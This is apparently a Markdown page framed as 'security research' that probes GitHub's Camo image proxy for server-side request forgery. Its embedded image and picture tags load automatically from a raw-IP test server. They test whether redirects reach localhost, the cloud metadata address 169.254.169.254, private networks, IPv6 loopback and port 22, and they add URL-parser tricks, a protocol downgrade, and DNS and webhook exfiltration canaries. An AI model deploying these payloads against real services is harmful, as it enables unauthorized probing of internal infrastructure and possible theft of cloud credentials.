# Security Research - v24

## GitHub Camo Probe (Using Custom Test Server)

All URLs point to test box at `http://164.90.187.218:8080`.
These endpoints exercise the proxy's redirect handling.

---

### 1) Baseline Fetch
<img alt="t1-basic" src="http://164.90.187.218:8080/ssrf-test-1-basic?nonce=v24-1" />

---

### 2) Slow & Large (Timeout/Limits)
<img alt="t2-slow-30s" src="http://164.90.187.218:8080/ssrf-test-7-slow?duration=30&nonce=v24-2" />
<img alt="t3-large-50mb" src="http://164.90.187.218:8080/ssrf-test-6-large?size=50&nonce=v24-3" />

---

### 3) Redirect Chains (What will Camo follow?)

#### External->External (should follow)
<picture>
  <source srcset="http://164.90.187.218:8080/ssrf-test-5-redirect?step=1&nonce=v24-4">
  <img alt="ext->ext" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
</picture>

#### External->Internal (should be blocked if protections work)
<picture>
  <source srcset="http://164.90.187.218:8080/redirect-to-internal?case=localhost&nonce=v24-5">
  <img alt="ext->127.0.0.1" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
</picture>

<picture>
  <source srcset="http://164.90.187.218:8080/redirect-to-internal?case=metadata&nonce=v24-6">
  <img alt="ext->169.254.169.254" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
</picture>

<picture>
  <source srcset="http://164.90.187.218:8080/redirect-to-internal?case=rfc1918-10&nonce=v24-7">
  <img alt="ext->10.0.0.1" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
</picture>

---

### 4) URL Parser Edge Cases

#### Userinfo Trick (which host is honored?)
<picture>
  <source srcset="http://164.90.187.218:8080/redirect-to-edge?case=userinfo-host-swap&nonce=v24-8">
  <img alt="userinfo-host-swap" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
</picture>

#### IPv6 Localhost
<picture>
  <source srcset="http://164.90.187.218:8080/redirect-to-edge?case=ipv6-loopback&nonce=v24-9">
  <img alt="[::1]" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
</picture>

---

### 5) Non-Standard Ports (Small Sample)
<picture>
  <source srcset="http://164.90.187.218:8080/redirect-to-port?port=22&nonce=v24-10">
  <img alt="port-22" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
</picture>

<picture>
  <source srcset="http://164.90.187.218:8080/redirect-to-port?port=8443&nonce=v24-11">
  <img alt="port-8443" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
</picture>

---

### 6) Double Redirect Chain
<picture>
  <source srcset="http://164.90.187.218:8080/double-redirect?first=external&second=localhost&nonce=v24-12">
  <img alt="double-redir" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
</picture>

---

### 7) Protocol Downgrade via Redirect
<picture>
  <source srcset="http://164.90.187.218:8080/redirect-protocol?from=https&to=http&target=127.0.0.1&nonce=v24-13">
  <img alt="https->http" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
</picture>

---

### 8) DNS Exfil Baseline
![dns-exfil](https://v24-dns-exfil.ee86932e-f8b0-4026-b848-5ded50f9edbc.dnshook.site/dns.gif)

### 9) Canary
![v24-canary](https://webhook.site/ee86932e-f8b0-4026-b848-5ded50f9edbc/v24-canary.gif)

---

*v24 - Custom server redirect testing*
